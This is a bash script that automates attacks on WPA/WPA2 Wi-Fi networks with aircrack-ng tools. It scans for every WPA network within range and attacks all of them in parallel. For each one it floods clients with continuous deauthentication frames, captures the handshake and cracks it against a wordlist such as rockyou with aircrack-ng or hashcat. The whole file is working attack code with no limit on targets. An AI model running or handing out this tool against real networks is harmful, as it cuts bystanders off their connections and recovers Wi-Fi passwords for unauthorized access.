#!/bin/bash
# WPA/WPA2 Handshake Capture & Cracking Script
# Author:ComradeZephyrA.K.A.AbdullahShahid
# CURRENTLY IN BETA ERRORS MAY OCCUR
# License: MIT
# Usage: sudo ./wpa_capture.sh [wordlist] [interface]

set -euo pipefail

# CONFIGURATION-Feel free to change wordlist path :)
WORDLIST=${1:-/usr/share/wordlists/rockyou.txt}
INTERFACE=${2:-$(iw dev | awk '$1=="Interface"{print $2; exit}')}
CAPTURE_DIR="./captures"
TIMEOUT=60
CRACK_HANDSHAKE=true
USE_HCXRIPPER=false

RED='\e[31m'; GREEN='\e[32m'; YELLOW='\e[33m'; BLUE='\e[34m'; NC='\e[0m'

# PRECHECKS
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] Must run as root.${NC}" && exit 1
fi

REQUIRED_CMDS=(airmon-ng airodump-ng aireplay-ng aircrack-ng iw iwconfig)
if $USE_HCXRIPPER; then
    REQUIRED_CMDS+=(hcxpcapngtool hashcat)
fi

for cmd in "${REQUIRED_CMDS[@]}"; do
    if ! command -v "$cmd" &>/dev/null; then
        echo -e "${YELLOW}[!] $cmd not found.${NC}"
        [[ "$cmd" =~ hcxpcapngtool|hashcat ]] && USE_HCXRIPPER=false || exit 1
    fi
done

if [[ ! -f "$WORDLIST" ]]; then
    echo -e "${RED}[!] Wordlist not found: $WORDLIST${NC}" && exit 1
fi

mkdir -p "$CAPTURE_DIR"
LOGFILE="$CAPTURE_DIR/capture_log_$(date +%F_%T).log"

cleanup() {
    echo -e "${BLUE}[*] Cleaning up...${NC}"
    [[ -n "${MONITOR:-}" ]] && airmon-ng stop "$MONITOR" &>/dev/null || true
    service NetworkManager restart &>/dev/null || true
    killall aireplay-ng airodump-ng &>/dev/null || true
    rm -f "$SCAN_FILE"
    echo -e "${BLUE}[*] Done.${NC}"
    exit 0
}
trap cleanup SIGINT SIGTERM

echo -e "${BLUE}[*] Killing conflicting processes...${NC}"
airmon-ng check kill &>/dev/null

echo -e "${BLUE}[*] Starting monitor mode on $INTERFACE${NC}"
airmon-ng start "$INTERFACE" &>/dev/null

MONITOR=$(iw dev | awk '$1=="Interface"{iface=$2} $1=="type" && $2=="monitor"{print iface}')
[[ -z "$MONITOR" ]] && echo -e "${RED}[!] Failed to enable monitor mode.${NC}" && exit 1

echo -e "${BLUE}[*] Scanning for APs (10s)...${NC}"
SCAN_FILE=$(mktemp -t scan_output-XXXX.csv)
airodump-ng "$MONITOR" --output-format csv -w "${SCAN_FILE%.*}" --write-interval 1 &>/dev/null &
SCAN_PID=$!
sleep 10
kill -INT $SCAN_PID
wait $SCAN_PID 2>/dev/null

AP_LIST=$(awk -F',' '/Station MAC/{exit} $1 ~ /([0-9A-F]{2}:){5}[0-9A-F]{2}/ && $6 ~ /WPA/ {
    gsub(/ /, "", $1); gsub(/ /, "", $4); essid=$14; sub(/^[[:space:]]+|[[:space:]]+$/, "", essid);
    print $1","$4","essid
}' "$SCAN_FILE")

[[ -z "$AP_LIST" ]] && echo -e "${RED}[!] No WPA/WPA2 networks found.${NC}" && cleanup
# Handshake Capturing Starts Here
capture_handshake() {
    local BSSID=$1 CHANNEL=$2 SSID=$3
    local SAFE_SSID=$(echo "$SSID" | tr ' ' '_' | tr -cd '[:alnum:]_-')
    local CAP_FILE="$CAPTURE_DIR/${SAFE_SSID}_${BSSID//:/_}"

    echo -e "${YELLOW}[+] Targeting $SSID ($BSSID) on channel $CHANNEL${NC}" | tee -a "$LOGFILE"

    iwconfig "$MONITOR" channel "$CHANNEL"
    timeout "$TIMEOUT" airodump-ng --bssid "$BSSID" --channel "$CHANNEL" --write "$CAP_FILE" "$MONITOR" &>/dev/null &
    local CAP_PID=$!

    aireplay-ng --deauth 0 -a "$BSSID" "$MONITOR" &>/dev/null &
    local DEAUTH_PID=$!

    wait $CAP_PID 2>/dev/null
    kill "$DEAUTH_PID" 2>/dev/null

    local CAP_PATH="${CAP_FILE}-01.cap"
    if [[ -f "$CAP_PATH" ]]; then
        if aircrack-ng "$CAP_PATH" -a2 -b "$BSSID" -w /dev/null | grep -q "handshake"; then
            echo -e "${GREEN}[✓] Handshake captured for $SSID ($BSSID)${NC}" | tee -a "$LOGFILE"

            if [ "$CRACK_HANDSHAKE" = true ]; then
                if $USE_HCXRIPPER; then
                    hcxpcapngtool -o "$CAP_FILE".22000 "$CAP_PATH"
                    hashcat -m 22000 "$CAP_FILE".22000 "$WORDLIST" --force | tee -a "$LOGFILE"
                else
                    aircrack-ng "$CAP_PATH" -w "$WORDLIST" | tee -a "$LOGFILE"
                fi
            fi
        else
            echo -e "${RED}[!] No handshake for $SSID ($BSSID)${NC}" | tee -a "$LOGFILE"
        fi
    else
        echo -e "${RED}[!] No capture file for $SSID ($BSSID)${NC}" | tee -a "$LOGFILE"
    fi
}

# Run handshake capture for each AP in parallel
IFS=$'\n'
for ap in $AP_LIST; do
    BSSID=$(echo "$ap" | cut -d',' -f1)
    CHANNEL=$(echo "$ap" | cut -d',' -f2)
    SSID=$(echo "$ap" | cut -d',' -f3 | tr -d '\r\n')
    capture_handshake "$BSSID" "$CHANNEL" "$SSID" &
done
wait

cleanup
